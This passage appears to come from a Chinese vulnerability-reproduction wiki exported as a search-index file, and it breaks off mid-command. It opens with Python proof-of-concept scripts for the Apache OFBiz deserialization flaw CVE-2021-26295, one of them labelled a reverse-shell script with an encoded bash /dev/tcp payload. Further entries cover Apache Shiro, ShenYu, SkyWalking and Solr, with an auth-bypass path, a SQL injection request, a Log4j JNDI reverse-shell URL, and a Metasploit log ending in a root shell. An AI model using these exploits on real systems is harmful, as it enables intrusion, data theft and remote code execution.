sys import sys import subprocess import binascii from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Apache OFBiz \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mDnslog \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def trans(s): return \"%s\" % ''.join('%.2x' % x for x in s) def POC_1(target_url, Dnslog): popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', \"URLDNS\", Dnslog], stdout=subprocess.PIPE) data = popen.stdout.read() hex_data = trans(data) headers = { 'Content-Type': 'text/xml' } post_data = '''\u003c?xml version='1.0' encoding='UTF-8'?\u003e\u003csoapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\u003e\u003csoapenv:Header/\u003e\u003csoapenv:Body\u003e\u003cpeiqi:clearAllEntityCaches xmlns:peiqi=\"http://ofbiz.apache.org/service/\"\u003e\u003cpeiqi:cus-obj\u003e%s\u003c/peiqi:cus-obj\u003e\u003c/peiqi:clearAllEntityCaches\u003e\u003c/soapenv:Body\u003e\u003c/soapenv:Envelope\u003e''' % hex_data vuln_url = target_url + \"/webtools/control/SOAPService\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=post_data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/webtools/control/SOAPService..... \\033[0m\".format(target_url)) if response.status_code == 200: print(\"\\033[36m[o] 请检查 Dnslog 响应\\n \\033[0m\") else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) Dnslog = str(input(\"\\033[35mDnslog \u003e\u003e\u003e \\033[0m\")) POC_1(target_url, Dnslog) 反弹shell脚本 import requests import sys import sys import subprocess import binascii from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Apache OFBiz \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mHex_data \u003e\u003e\u003e 在文件中修改 \\033[0m') print('+------------------------------------------') def POC_1(target_url, Dnslog): # java -jar ysoserial.jar ROME \"bash -c {echo,YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvLyA8JjEn}|{base64,-d}|{bash,-i}\" | xxd|cut -f 2,3,4,5,6,7,8,9 -d \" \"|tr -d ' '|tr -d '\\n' hex_data = \"aced0xxxxxxxxxxxxxxxxxxxxxx678\" headers = { 'Content-Type': 'text/xml' } post_data = '''\u003c?xml version='1.0' encoding='UTF-8'?\u003e\u003csoapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\u003e\u003csoapenv:Header/\u003e\u003csoapenv:Body\u003e\u003cpeiqi:clearAllEntityCaches xmlns:peiqi=\"http://ofbiz.apache.org/service/\"\u003e\u003cpeiqi:cus-obj\u003e%s\u003c/peiqi:cus-obj\u003e\u003c/peiqi:clearAllEntityCaches\u003e\u003c/soapenv:Body\u003e\u003c/soapenv:Envelope\u003e''' % hex_data vuln_url = target_url + \"/webtools/control/SOAPService\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=post_data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/webtools/control/SOAPService..... \\033[0m\".format(target_url)) if response.status_code == 200: print(\"\\033[36m[o] 请检查 监听地址 响应\\n \\033[0m\") else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url, Dnslog) ","date":"0001-01-01","objectID":"/apache-ofbiz-rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2021-26295/:6:0","tags":null,"title":"","uri":"/apache-ofbiz-rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2021-26295/"},{"categories":null,"content":"Apache ShenYu dashboardUser 账号密码泄漏漏洞 CVE-2021-37580 ","date":"0001-01-01","objectID":"/apache-shenyu-dashboarduser-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-37580/:0:0","tags":null,"title":"","uri":"/apache-shenyu-dashboarduser-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-37580/"},{"categories":null,"content":"漏洞描述 Apache ShenYu Admin爆出身份验证绕过漏洞，攻击者可通过该漏洞绕过JSON Web Token (JWT)安全认证，直接进入系统后台。 Apache ShenYu 是应用于所有微服务场景的，可扩展、高性能、响应式的 API 网关解决方案。 ","date":"0001-01-01","objectID":"/apache-shenyu-dashboarduser-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-37580/:1:0","tags":null,"title":"","uri":"/apache-shenyu-dashboarduser-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-37580/"},{"categories":null,"content":"漏洞影响 Apache ShenYu 2.3.0 Apache ShenYu 2.4.0 ","date":"0001-01-01","objectID":"/apache-shenyu-dashboarduser-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-37580/:2:0","tags":null,"title":"","uri":"/apache-shenyu-dashboarduser-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-37580/"},{"categories":null,"content":"网络测绘 title==\"ShenYu Gateway\" ","date":"0001-01-01","objectID":"/apache-shenyu-dashboarduser-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-37580/:3:0","tags":null,"title":"","uri":"/apache-shenyu-dashboarduser-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-37580/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /dashboardUser ","date":"0001-01-01","objectID":"/apache-shenyu-dashboarduser-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-37580/:4:0","tags":null,"title":"","uri":"/apache-shenyu-dashboarduser-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-37580/"},{"categories":null,"content":"Apache Shiro 1.6.0 身份认证绕过漏洞 CVE-2020-13933 ","date":"0001-01-01","objectID":"/apache-shiro-1.6.0-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2020-13933/:0:0","tags":null,"title":"","uri":"/apache-shiro-1.6.0-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2020-13933/"},{"categories":null,"content":"漏洞描述 2020年8月18日，Apache Shiro官方发布安全通告 Apache Shiro身份验证绕过漏洞（CVE-2020-13933），经过分析，攻击者可以通过构造特殊的HTTP请求实现身份验证绕过。 ","date":"0001-01-01","objectID":"/apache-shiro-1.6.0-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2020-13933/:1:0","tags":null,"title":"","uri":"/apache-shiro-1.6.0-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2020-13933/"},{"categories":null,"content":"漏洞影响 Apache Shiro \u003c 1.6.0 ","date":"0001-01-01","objectID":"/apache-shiro-1.6.0-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2020-13933/:2:0","tags":null,"title":"","uri":"/apache-shiro-1.6.0-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2020-13933/"},{"categories":null,"content":"漏洞复现 正常访问 /admin，需要登录： 构造恶意请求绕过： admin/%3b ","date":"0001-01-01","objectID":"/apache-shiro-1.6.0-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2020-13933/:3:0","tags":null,"title":"","uri":"/apache-shiro-1.6.0-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2020-13933/"},{"categories":null,"content":"Apache Shiro 小于1.2.4反序列化漏洞 CVE-2016-4437 ","date":"0001-01-01","objectID":"/apache-shiro-%E5%B0%8F%E4%BA%8E1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2016-4437/:0:0","tags":null,"title":"","uri":"/apache-shiro-%E5%B0%8F%E4%BA%8E1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2016-4437/"},{"categories":null,"content":"漏洞描述 Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。 Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。 ","date":"0001-01-01","objectID":"/apache-shiro-%E5%B0%8F%E4%BA%8E1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2016-4437/:1:0","tags":null,"title":"","uri":"/apache-shiro-%E5%B0%8F%E4%BA%8E1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2016-4437/"},{"categories":null,"content":"漏洞影响 Apache Shiro \u003c= 1.2.4 ","date":"0001-01-01","objectID":"/apache-shiro-%E5%B0%8F%E4%BA%8E1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2016-4437/:2:0","tags":null,"title":"","uri":"/apache-shiro-%E5%B0%8F%E4%BA%8E1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2016-4437/"},{"categories":null,"content":"漏洞环境 https://github.com/vulhub/vulhub.git cd vulhub/shiro/CVE-2016-4437 docker-compose up -d 访问http://xxx.xxx.xxx.xxx:8080/login 正常即可 ","date":"0001-01-01","objectID":"/apache-shiro-%E5%B0%8F%E4%BA%8E1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2016-4437/:3:0","tags":null,"title":"","uri":"/apache-shiro-%E5%B0%8F%E4%BA%8E1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2016-4437/"},{"categories":null,"content":"漏洞复现 Shiro已经有比较完善的工具 https://github.com/insightglacier/Shiro_exploit https://github.com/feihong-cs/ShiroExploit/releases/tag/v2.51 这里使用的是 ShiroExploit 工具进行复现 打开后输入url即可 成功反弹shell ","date":"0001-01-01","objectID":"/apache-shiro-%E5%B0%8F%E4%BA%8E1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2016-4437/:4:0","tags":null,"title":"","uri":"/apache-shiro-%E5%B0%8F%E4%BA%8E1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2016-4437/"},{"categories":null,"content":"参考文章 Shiro RememberMe 1.2.4远程代码执行漏洞-详细分析 ","date":"0001-01-01","objectID":"/apache-shiro-%E5%B0%8F%E4%BA%8E1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2016-4437/:5:0","tags":null,"title":"","uri":"/apache-shiro-%E5%B0%8F%E4%BA%8E1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2016-4437/"},{"categories":null,"content":"Apache SkyWalking graphql SQL注入漏洞 CVE-2020-9483 ","date":"0001-01-01","objectID":"/apache-skywalking-graphql-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-9483/:0:0","tags":null,"title":"","uri":"/apache-skywalking-graphql-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-9483/"},{"categories":null,"content":"漏洞描述 腾讯安全威胁情报中心监测到Apache SkyWalking发布更新，修复了一个SQL注入漏洞（编号：CVE-2020-9483）。远程攻击者可通过Apache SkyWalking默认开放的未授权GraphQL接口构造恶意请求包进行注入攻击，成功利用此漏洞可造成敏感数据泄漏。该漏洞等级为高危，腾讯安全专家建议相关企业尽快修复。 ","date":"0001-01-01","objectID":"/apache-skywalking-graphql-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-9483/:1:0","tags":null,"title":"","uri":"/apache-skywalking-graphql-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-9483/"},{"categories":null,"content":"漏洞影响 Apache SkyWalking 6.0.0~6.6.0 Apache SkyWalking 7.0.0 ","date":"0001-01-01","objectID":"/apache-skywalking-graphql-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-9483/:2:0","tags":null,"title":"","uri":"/apache-skywalking-graphql-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-9483/"},{"categories":null,"content":"环境搭建 https://archive.apache.org/dist/skywalking/6.5.0/apache-skywalking-apm-6.5.0.tar.gz https://archive.apache.org/dist/skywalking/8.3.0/apache-skywalking-apm-6.5.0-src.tgz ","date":"0001-01-01","objectID":"/apache-skywalking-graphql-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-9483/:3:0","tags":null,"title":"","uri":"/apache-skywalking-graphql-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-9483/"},{"categories":null,"content":"漏洞复现 下载编译好的源码后，进入bin目录，修改 oapService.sh 通过IDEA进行远程调试 for i in \"$OAP_HOME\"/oap-libs/*.jar do CLASSPATH=\"$i:$CLASSPATH\" done OAP_OPTIONS=\" -Doap.logDir=${OAP_LOG_DIR}\" eval exec \"\\\"$_RUNJAVA\\\" ${JAVA_OPTS} ${OAP_OPTIONS} -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 -classpath $CLASSPATH org.apache.skywalking.oap.server.starter.OAPServerStartUp \\ 2\u003e${OAP_LOG_DIR}/oap.log 1\u003e /dev/null \u0026\" if [ $? -eq 0 ]; then sleep 1 echo \"SkyWalking OAP started successfully!\" else echo \"SkyWalking OAP started failure!\" exit 1 配置IDEA JVM Debug 查看CVE的修复commit寻找修复的地方 打下断点并发送Payload请求包 POST /graphql HTTP/1.1 Host: Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cache-Control: max-age=0 Content-Type: application/json Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 Content-Length: 416 { \"query\": \"query queryData($duration: Duration!) {globalP99: getLinearIntValues(metric: {name: \\\"all_p99\\\", id: \\\"') UNION ALL SELECT NULL,CONCAT('~', H2VERSION(), '~')--\\\" }, duration: $duration) { values { value } }}\", \"variables\": { \"duration\": { \"end\": \"2020-08-07 1418\", \"start\": \"2020-08-07 1417\", \"step\": \"MINUTE\" } } } 在 org.apache.skywalking.oap.query.graphql.resolver 中我们可以看到参数 metrics.getId() 没有过滤就直接传入 getLinearIntValues 跟随来到 org.apache.skywalking.oap.server.core.query.MetricQueryService.getLinearIntValues(MetricQueryService.java:96) 来到 org.apache.skywalking.oap.server.storage.plugin.jdbc.h2.dao.H2MetricsQueryDAO.getLinearIntValues(H2MetricsQueryDAO.java:117)，这里就将拼接的语句带入数据库进行查询，造成SQL注入 调用栈如下 getLinearIntValues:117, H2MetricsQueryDAO (org.apache.skywalking.oap.server.storage.plugin.jdbc.h2.dao) getLinearIntValues:96, MetricQueryService (org.apache.skywalking.oap.server.core.query) getLinearIntValues:60, MetricQuery (org.apache.skywalking.oap.query.graphql.resolver) execute:87, GraphQLQueryHandler (org.apache.skywalking.oap.query.graphql) doPost:81, GraphQLQueryHandler (org.apache.skywalking.oap.query.graphql) doPost:54, JettyJsonHandler (org.apache.skywalking.oap.server.library.server.jetty) service:101, JettyJsonHandler (org.apache.skywalking.oap.server.library.server.jetty) service:105, JettyJsonHandler (org.apache.skywalking.oap.server.library.server.jetty) ","date":"0001-01-01","objectID":"/apache-skywalking-graphql-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-9483/:4:0","tags":null,"title":"","uri":"/apache-skywalking-graphql-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-9483/"},{"categories":null,"content":"Apache Solr JMX服务 RCE CVE-2019-12409 ","date":"0001-01-01","objectID":"/apache-solr-jmx%E6%9C%8D%E5%8A%A1-rce-cve-2019-12409/:0:0","tags":null,"title":"","uri":"/apache-solr-jmx%E6%9C%8D%E5%8A%A1-rce-cve-2019-12409/"},{"categories":null,"content":"漏洞描述 Java ManagementExtensions（JMX）是一种Java技术，为管理和监视应用程序、系统对象、设备（如打印机）和面向服务的网络提供相应的工具。JMX 作为 Java的一种Bean管理机制，如果JMX服务端口暴露，那么远程攻击者可以让该服务器远程加载恶意的Bean文件，随着Bean的滥用导致远程代码执行。 ","date":"0001-01-01","objectID":"/apache-solr-jmx%E6%9C%8D%E5%8A%A1-rce-cve-2019-12409/:1:0","tags":null,"title":"","uri":"/apache-solr-jmx%E6%9C%8D%E5%8A%A1-rce-cve-2019-12409/"},{"categories":null,"content":"漏洞影响 Apache Solr 8.1.1 Apache Solr 8.2.0 ","date":"0001-01-01","objectID":"/apache-solr-jmx%E6%9C%8D%E5%8A%A1-rce-cve-2019-12409/:2:0","tags":null,"title":"","uri":"/apache-solr-jmx%E6%9C%8D%E5%8A%A1-rce-cve-2019-12409/"},{"categories":null,"content":"环境搭建 下载 Apache Solr 8.2.0 也可以docker搭建 docker pull solr:8.2.0 docker run --name solr -d -p 8983:8983 -t solr:8.2.0 访问 http://xxx.xxx.xxx.xxx:8983/solr/ 正常即可 ","date":"0001-01-01","objectID":"/apache-solr-jmx%E6%9C%8D%E5%8A%A1-rce-cve-2019-12409/:3:0","tags":null,"title":"","uri":"/apache-solr-jmx%E6%9C%8D%E5%8A%A1-rce-cve-2019-12409/"},{"categories":null,"content":"漏洞复现 查看搭建的Solr是否存在漏洞,查看solr.in.sh配置文件中的ENABLE_REMOTE_JMX_OPTS选项设置是否为“Ture”，如果为Ture，则存在漏洞 查看漏洞端口18983是否开放 nmap xxx.xxx.xxx.xxx -p 18983 root@kali:~/桌面# msfconsole , , / \\ ((__---,,,---__)) (_) O O (_)_________ \\ _ / |\\ o_o \\ M S F | \\ \\ _____ | * ||| WW||| ||| ||| =[ metasploit v5.0.101-dev ] + -- --=[ 2049 exploits - 1108 auxiliary - 344 post ] + -- --=[ 562 payloads - 45 encoders - 10 nops ] + -- --=[ 7 evasion ] Metasploit tip: Writing a custom module? After editing your module, why not try the reload command msf5 \u003e use exploit/multi/misc/java_jmx_server [*] No payload configured, defaulting to java/meterpreter/reverse_tcp msf5 exploit(multi/misc/java_jmx_server) \u003e set rhost 192.168.51.146 rhost =\u003e 192.168.51.146 msf5 exploit(multi/misc/java_jmx_server) \u003e set rport 18983 rport =\u003e 18983 msf5 exploit(multi/misc/java_jmx_server) \u003e set payload java/meterpreter/reverse_tcp payload =\u003e java/meterpreter/reverse_tcp msf5 exploit(multi/misc/java_jmx_server) \u003e options Module options (exploit/multi/misc/java_jmx_server): Name Current Setting Required Description ---- --------------- -------- ----------- JMXRMI jmxrmi yes The name where the JMX RMI interface is bound JMX_PASSWORD no The password to interact with an authenticated JMX endpoint JMX_ROLE no The role to interact with an authenticated JMX endpoint RHOSTS 192.168.51.146 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:\u003cpath\u003e' RPORT 18983 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) Payload options (java/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.51.149 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Generic (Java Payload) msf5 exploit(multi/misc/java_jmx_server) \u003e run [*] Started reverse TCP handler on 192.168.51.149:4444 [*] 192.168.51.146:18983 - Using URL: http://0.0.0.0:8080/xln8izoCtDUbBVm [*] 192.168.51.146:18983 - Local IP: http://192.168.51.149:8080/xln8izoCtDUbBVm [*] 192.168.51.146:18983 - Sending RMI Header... [*] 192.168.51.146:18983 - Discovering the JMXRMI endpoint... [+] 192.168.51.146:18983 - JMXRMI endpoint on 127.0.1.1:18983 [*] 192.168.51.146:18983 - Proceeding with handshake... [+] 192.168.51.146:18983 - Handshake with JMX MBean server on 127.0.1.1:18983 [*] 192.168.51.146:18983 - Loading payload... [*] 192.168.51.146:18983 - Replied to request for mlet [*] 192.168.51.146:18983 - Replied to request for payload JAR [*] 192.168.51.146:18983 - Executing payload... [*] 192.168.51.146:18983 - Replied to request for payload JAR [*] Sending stage (53944 bytes) to 192.168.51.146 [*] Meterpreter session 1 opened (192.168.51.149:4444 -\u003e 192.168.51.146:56234) at 2020-11-05 14:17:04 +0800 meterpreter \u003e meterpreter \u003e shell Process 1 created. Channel 1 created. id 用户id=0(root) 组id=0(root) 组=0(root) ","date":"0001-01-01","objectID":"/apache-solr-jmx%E6%9C%8D%E5%8A%A1-rce-cve-2019-12409/:4:0","tags":null,"title":"","uri":"/apache-solr-jmx%E6%9C%8D%E5%8A%A1-rce-cve-2019-12409/"},{"categories":null,"content":"Apache Solr Log4j组件 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/apache-solr-log4j%E7%BB%84%E4%BB%B6-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/apache-solr-log4j%E7%BB%84%E4%BB%B6-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Apache Solr Log4j组件 远程命令执行漏洞，详情略 ","date":"0001-01-01","objectID":"/apache-solr-log4j%E7%BB%84%E4%BB%B6-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/apache-solr-log4j%E7%BB%84%E4%BB%B6-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Apache Solr ","date":"0001-01-01","objectID":"/apache-solr-log4j%E7%BB%84%E4%BB%B6-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/apache-solr-log4j%E7%BB%84%E4%BB%B6-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"APACHE-Solr\" ","date":"0001-01-01","objectID":"/apache-solr-log4j%E7%BB%84%E4%BB%B6-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/apache-solr-log4j%E7%BB%84%E4%BB%B6-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /solr/admin/collections?action=${jndi:ldap://xxx/Basic/ReverseShell/ip/87}\u0026wt=json ","date":"0001-01-01","objectID":"/apache-solr-log4j%E7%BB%84%E4%BB%B6-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/apache-solr-log4j%E7%BB%84%E4%BB%B6-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Apache Solr RCE 未授权上传漏洞 CVE-2020-13957 ","date":"0001-01-01","objectID":"/apache-solr-rce-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2020-13957/:0:0","tags":null,"title":"","uri":"/apache-solr-rce-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2020-13957/"},{"categories":null,"content":"漏洞描述 在特定的Solr版本中ConfigSet API存在未授权上传漏洞，攻击者利用漏洞可实现远程代码执行。 ","date":"0001-01-01","objectID":"/apache-solr-rce-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2020-13957/:1:0","tags":null,"title":"","uri":"/apache-solr-rce-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2020-13957/"},{"categories":null,"content":"漏洞影响 Apache Solr 6.6.0 -6.6.5 Apache Solr 7.0.0 -7.7.3 Apache Solr 8.0.0 -8.6.2 ","date":"0001-01-01","objectID":"/apache-solr-rce-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2020-13957/:2:0","tags":null,"title":"","uri":"/apache-solr-rce-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2020-13957/"},{"categories":null,"content":"环境搭建 选择一个存在漏洞的版本 下载各版本Solr地址 这里复现使用的是 Apache Solr 7.7.0 进行复现 下载后执行以下命令进行环境部署 cd solr-7.7.0 ./bin/solr start -e cloud -force 然后一路回车，直至出现 Created collection 'gettingstarted' with 2 shard(s), 2 replica(s) with config-set 'gettingstarted' Enabling auto soft-commits with maxTime 3 secs using the Config API POSTing request to Config API: http://localhost:8983/solr/gettingstarted/config {\"set-property\":{\"updateHandler.autoSoftCommit.maxTime\":\"3000\"}} Successfully set-property updateHandler.autoSoftCommit.maxTime to 3000 SolrCloud example running, please visit: http://localhost:8983/solr 访问 http://xxx.xxx.xxx.xxx:8983/solr/ 正常即可 ","date":"0001-01-01","objectID":"/apache-solr-rce-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2020-13957/:3:0","tags":null,"title":"","uri":"/apache-solr-rce-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2020-13957/"},{"categories":null,"content":"漏洞复现 在攻击机上下载目标版本的Solr,执行下列命令打包压缩文件 solr-7.7.0/server/solr/configsets/sample_techproducts_configs/conf zip -r - * \u003e vuln.zip 将 vuln.zip 进行上传 curl -X POST --header 